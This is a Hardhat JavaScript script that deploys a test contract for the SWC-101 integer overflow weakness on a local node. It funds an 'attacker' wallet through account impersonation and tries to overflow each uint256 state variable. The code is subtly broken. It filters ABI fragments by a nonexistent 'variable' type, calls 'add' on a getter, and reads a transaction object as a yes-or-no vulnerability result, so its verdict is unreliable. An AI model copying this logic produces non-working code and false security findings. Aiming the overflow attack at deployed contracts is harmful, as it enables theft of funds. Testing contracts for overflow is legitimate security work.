const hre = require("hardhat")
const { ethers } = require("hardhat")
const { utils } = require("ethers")
require("dotenv").config()

async function main() {
    const providerUrl = "http://127.0.0.1:8545/"

    // Compile the contracts
    await hre.run("compile")

    // Get the ContractFactory for the contract
    const Contract = await ethers.getContractFactory("swc101_1")

    // Deploy the contract
    const contract = await Contract.deploy()

    // Wait for the contract to be deployed
    await contract.deployed()

    console.log(`Contract deployed to: ${contract.address}`)

    // Get all the unsigned integer state variables
    const abi = contract.interface
    const stateVariables = abi.fragments.filter(
        (x) =>
            x.type === "variable" &&
            x.stateMutability === "nonpayable" &&
            x.typeName.type === "uint256"
    )
    const variableNames = stateVariables.map((x) => x.name)

    console.log(`State variables: ${variableNames.join(", ")}`)

    // Create a new account and fund it with ETH
    const attackerWallet = ethers.Wallet.createRandom()
    const attackerAddress = attackerWallet.address
    console.log(`Attacker address: ${attackerAddress}`)
    const fundingAmount = ethers.utils.parseEther("1")

    await hre.network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [process.env.FORK_ACCOUNT],
    })

    const signer = await ethers.provider.getSigner(process.env.FORK_ACCOUNT)

    // Fund the attacker account with ETH
    await signer.sendTransaction({
        to: attackerAddress,
        value: fundingAmount,
    })

    console.log(`Funded attacker account with ${fundingAmount} ETH`)

    // Send transactions to test for integer overflow
    for (let j = 0; j < variableNames.length; j++) {
        const variableName = variableNames[j]

        console.log(
            `Testing for integer overflow on variable ${variableName}...`
        )

        // Get the current value of the variable
        const currentValue = await contract[variableName]()

        // Calculate the maximum value of the variable
        const maxUint256 = ethers.constants.MaxUint256
        const maxValue = maxUint256.sub(currentValue)

        console.log(`Current value: ${currentValue}`)
        console.log(`Maximum value: ${maxValue}`)

        // Send a transaction to trigger the integer overflow
        try {
            const tx = await contract[variableName]
                .connect(attackerWallet)
                .add(maxValue)

            console.log(`Transaction sent: ${tx.hash}`)
        } catch (e) {
            console.log(`Error sending transaction: ${e}`)
        }
    }
    console.log("Before adding value: ", (await contract.retrieve()).toString())
    // Check if the contract was successfully attacked
    const isVulnerable = await contract.add(100)

    console.log(`swc101_1 is ${isVulnerable ? "vulnerable" : "not vulnerable"}`)
    console.log("After adding value: ", (await contract.retrieve()).toString())
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
